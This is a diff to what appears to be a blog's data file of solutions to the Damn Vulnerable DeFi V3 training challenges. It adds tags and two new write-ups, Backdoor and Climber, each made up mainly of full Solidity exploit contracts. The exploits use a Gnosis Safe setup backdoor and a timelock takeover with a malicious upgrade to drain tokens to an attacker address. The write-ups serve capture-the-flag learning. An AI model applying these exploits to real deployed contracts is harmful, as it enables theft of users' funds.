@@ -5,6 +5,7 @@ export default {
             title: `Damn Vulnerable DeFi V3 Solutions: Unstoppable`,
             description: `My solution to the 1st Damn Vulnerable DeFi v3 challenge.`,
             date: "May 30, 2023",
+            tags: ["ETH", "Security"],
             snippets: [
                 `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`,
                 `it("Exploit", async function () {
@@ -17,6 +18,7 @@ export default {
             title: `Damn Vulnerable DeFi V3 Solutions: Naive Receiver`,
             description: `My solution to the 2nd Damn Vulnerable DeFi v3 challenge.`,
             date: "June 1, 2023",
+            tags: ["ETH", "Security", "FlashLoans"],
             snippets: [
                 `// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -58,6 +60,7 @@ contract Exploit_NaiveReceiver {
             title: `Damn Vulnerable DeFi V3 Solutions: Truster`,
             description: `My solution to the 3rd Damn Vulnerable DeFi v3 challenge.`,
             date: "June 2, 2023",
+            tags: ["Security", "Exploit"],
             snippets: [
                 `// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -104,6 +107,7 @@ contract Exploit_Truster {
             title: `Damn Vulnerable DeFi V3 Solutions: Side Entrance`,
             description: `My solution to the 4th Damn Vulnerable DeFi v3 challenge.`,
             date: "June 3, 2023",
+            tags: ["Security", "Flash Loan"],
             snippets: [
                 `// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -155,6 +159,7 @@ contract Exploit_SideEntrance {
             title: `Damn Vulnerable DeFi V3 Solutions: The Rewarder`,
             description: `My solution to the 5th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 5, 2023",
+            tags: ["Security", "Flash Loan", "ERC20 Snapshot"],
             snippets: [
                 `// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -232,6 +237,7 @@ contract Exploit_TheRewarder {
             title: `Damn Vulnerable DeFi V3 Solutions: Selfie`,
             description: `My solution to the 6th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 6, 2023",
+            tags: ["Security", "Governance", "Flash Loan"],
             snippets: [
                 `// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -299,6 +305,7 @@ contract Exploit_Selfie is IERC3156FlashBorrower {
             title: `Damn Vulnerable DeFi V3 Solutions: Compromised`,
             description: `My solution to the 7th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 7, 2023",
+            tags: ["Security", "DeFi", "Oracle"],
             snippets: [
                 `//HTTP/2 200 OK
 //content-type: text/html
@@ -336,6 +343,7 @@ contract Exploit_Selfie is IERC3156FlashBorrower {
             title: `Damn Vulnerable DeFi V3 Solutions: Puppet`,
             description: `My solution to the 8th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 8, 2023",
+            tags: ["Security", "DeFi", "Liquidity Pool"],
             snippets: [
                 `// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -411,6 +419,7 @@ contract Exploit_Puppet {
             title: `Damn Vulnerable DeFi V3 Solutions: Puppet V2`,
             description: `My solution to the 9th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 9, 2023",
+            tags: ["Security", "DeFi", "Liquidity Pool"],
             snippets: [
                 `it("Exploit", async function () {
     await token
@@ -446,6 +455,7 @@ contract Exploit_Puppet {
             title: `Damn Vulnerable DeFi V3 Solutions: Free Rider`,
             description: `My solution to the 10th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 10, 2023",
+            tags: ["Security", "DeFi", "Flash Swap"],
             snippets: [
                 `// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -470,7 +480,6 @@ interface IUniswapV2Pair {
 
 interface IWETH is IERC20 {
     function deposit() external payable;
-
     function withdraw(uint amount) external;
 }
 
@@ -550,6 +559,184 @@ contract Exploit_FreeRider is IUniswapV2Callee, IERC721Receiver {
     await attacker.exploit();
 });
 `,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-11-backdoor",
+            title: `Damn Vulnerable DeFi V3 Solutions: Backdoor`,
+            description: `My solution to the 11th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 11, 2023",
+            tags: ["Security", "Gnosis Safe", "Delegate Call"],
+            snippets: [
+                `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./WalletRegistry.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+
+contract ApproveContract {
+    function approve(address attacker, IERC20 token) public {
+        token.approve(attacker, type(uint256).max);
+    }
+}
+
+contract Exploit_Backdoor {
+    WalletRegistry immutable walletRegistry;
+    GnosisSafeProxyFactory immutable factory;
+    GnosisSafe immutable masterCopy;
+    IERC20 immutable token;
+    ApproveContract immutable approveCode;
+    address immutable attackerEOA;
+
+    address[] public users;
+
+    constructor(WalletRegistry _walletRegistiry, address[] memory _users) {
+        walletRegistry = _walletRegistiry;
+        factory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
+        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
+        token = walletRegistry.token();
+        approveCode = new ApproveContract();
+        attackerEOA = msg.sender;
+        users = _users;
+
+        exploit();
+    }
+
+    function exploit() public {
+        address wallet;
+        bytes memory setupData;
+        address[] memory owner = new address[](1);
+
+        for (uint256 i = 0; i < 4; i++) {
+            owner[0] = users[i];
+            //setup gnosis safe wallet
+            setupData = abi.encodeWithSelector(
+                GnosisSafe.setup.selector,
+                owner,
+                1,
+                address(approveCode),
+                //here is the call we inserted that will be made during wallet creation
+                //it will grant this contract unlimited token approvals
+                abi.encodeWithSelector(
+                    approveCode.approve.selector,
+                    address(this),
+                    token
+                ),
+                address(0),
+                address(token),
+                0,
+                payable(attackerEOA)
+            );
+
+            //create the wallet behalf of the users
+            wallet = address(
+                factory.createProxyWithCallback(
+                    address(masterCopy),
+                    setupData,
+                    0,
+                    walletRegistry
+                )
+            );
+
+            token.transferFrom(wallet, attackerEOA, token.balanceOf(wallet));
+        }
+    }
+}`,
+                `it('Exploit', async function () {
+    //exploit() function in the attacker contract will be called during deployment
+    attacker = await (await ethers.getContractFactory('Exploit_Backdoor', player)).deploy(
+        walletRegistry.address,
+        users
+    );
+});`,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-12-climber",
+            title: `Damn Vulnerable DeFi V3 Solutions: Climber`,
+            description: `My solution to the 11th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 12, 2023",
+            tags: ["Security", "UUPS Proxy"],
+            snippets: [
+                `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./ClimberVault.sol";
+
+contract ClimberVaultV2 is ClimberVault {
+    function sweep(IERC20 token, address attackerEOA) public {
+        token.transfer(attackerEOA, token.balanceOf(address(this)));
+    }
+}
+
+contract Exploit_Climber {
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    IERC20 token;
+
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+
+    constructor(ClimberVault _vault, IERC20 _token) {
+        vault = _vault;
+        timelock = ClimberTimelock(payable(vault.owner()));
+        token = _token;
+    }
+
+    function exploit() public payable {
+        targets = [
+            address(timelock),
+            address(timelock),
+            address(vault),
+            address(this)
+        ];
+        values = [0, 0, 0, 0];
+        dataElements = [
+            //set the delay to 0 to not get blocked by it.
+            abi.encodeWithSelector(timelock.updateDelay.selector, 0),
+            //grant this contract 'PROPOSER' role so it can schedule actions.
+            abi.encodeWithSelector(
+                timelock.grantRole.selector,
+                PROPOSER_ROLE,
+                address(this)
+            ),
+            //upgrade the contract with ClimberVaultV2 contract we created.
+            abi.encodeWithSelector(
+                vault.upgradeToAndCall.selector,
+                address(new ClimberVaultV2()), //new implementation address
+                // call that will be made after updating the implementation contract
+                // the call will transfer all the tokens to attackerEOA
+                abi.encodeWithSelector(
+                    //malicious function that we insterted into the new logic contract
+                    ClimberVaultV2.sweep.selector,
+                    address(token),
+                    msg.sender //attacker's EOA
+                )
+            ),
+            //lastly call the function in this contract that schedules
+            //all the these calls.
+            abi.encodeWithSignature("scheduleOperation()")
+        ];
+        //execute the actions above
+        timelock.execute(targets, values, dataElements, 0);
+    }
+
+    function scheduleOperation() public payable {
+        //here the first three calls is made. Lastly we need to
+        //schedule these calls so execute function does not revert.
+        //we can make this call because we granted 'PROPOSER' role 
+        //to this contract prior to this.
+        timelock.schedule(targets, values, dataElements, 0);
+    }
+}`,
+                `it('Exploit', async function () {
+    attacker = await (await ethers.getContractFactory('Exploit_Climber', player)).deploy(
+        vault.address,
+        token.address
+    );
+    await attacker.connect(player).exploit();
+});`,
             ],
         },
     ],
